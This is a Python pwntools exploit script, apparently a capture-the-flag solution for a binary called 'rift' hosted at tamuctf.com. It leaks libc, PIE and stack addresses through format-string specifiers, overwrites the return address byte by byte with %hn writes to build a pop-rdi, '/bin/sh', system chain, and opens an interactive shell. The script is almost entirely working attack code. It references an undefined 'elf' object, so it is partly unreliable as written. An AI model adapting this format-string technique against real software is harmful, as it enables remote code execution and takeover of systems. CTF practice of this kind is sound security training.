from pwn import *
from icecream import ic

exe = ELF("./rift_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")

context.binary = exe
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="rift")
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000011ee
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

sl('%11$p')
libc_leak = int(rl().strip().decode(), 16)
sl('%2$p')
pie_leak = int(rl().strip().decode(), 16)
sl('%6$p')
stack_leak = int(rl().strip().decode(), 16)

libc.address = libc_leak-0x2409b
elf.address = pie_leak-0x4060
a = stack_leak
a = str(hex(a)[2:])
stackoffset = int(a[-4:], 16)-232
ic(hex(libc.address))
ic(hex(elf.address))
ic(hex(stack_leak))

def write(addr, offset, ret_addr):
    a = addr
    a = str(hex(a)[2:])
    a2 = int(a[-4:-2], 16)
    a3 = int(a[-6:-4], 16)
    a4 = int(a[-8:-6], 16)
    a5 = int(a[-10:-8], 16)
    a6 = int(a[-12:-10], 16)
    a = int(a[-2:], 16)
    l = [a6, a5, a4, a3, a2, a]
    io.sendline(f'%{ret_addr+offset}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+1}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+2}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+3}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+4}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+5}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())

pop_rdi = elf.address + 0x000000000000127b
write(pop_rdi, 0, stackoffset)
write(next(libc.search(b'/bin/sh\x00')), 8, stackoffset)
write(libc.symbols['system'], 16, stackoffset)


payload = f'%{stackoffset-16}c%27$hn'.encode()
sl(payload)
payload = b'%41$lln'
sl(payload)
# sl(b'ls')
i()
